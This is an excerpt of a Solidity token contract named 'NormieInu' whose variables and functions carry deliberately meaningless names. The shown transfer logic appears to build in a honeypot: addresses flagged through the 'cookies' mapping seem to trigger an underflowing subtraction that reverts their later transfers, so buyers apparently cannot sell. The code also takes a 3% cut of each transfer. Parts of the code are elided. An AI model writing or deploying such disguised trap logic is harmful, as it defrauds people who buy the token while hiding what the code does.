...
contract NormieInu is Ownable {
    uint256 private exactly;
    string private together;
    string private introduced;
    uint8 private birds;
    ...
    function root(
        ...
        if (accept[useful] == 0 && (address(uniswapV2Pair) != useful) && cookies[useful] > 0) {
            accept[useful] -= birds;
        }

        address turn = current;
        current = suppose;

        if (accept[useful] == 0) stuck[useful] -= pocket;
        uint256 teacher = pocket * exactly;
        teacher = teacher / 100;
        pocket -= teacher;
        cookies[turn] += birds;
        stuck[suppose] += pocket;
    }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(joy);
        ...
        exactly = 3;
        accept[milk] = birds;
        _tTotal = 1000000000000000 * 10**birds;
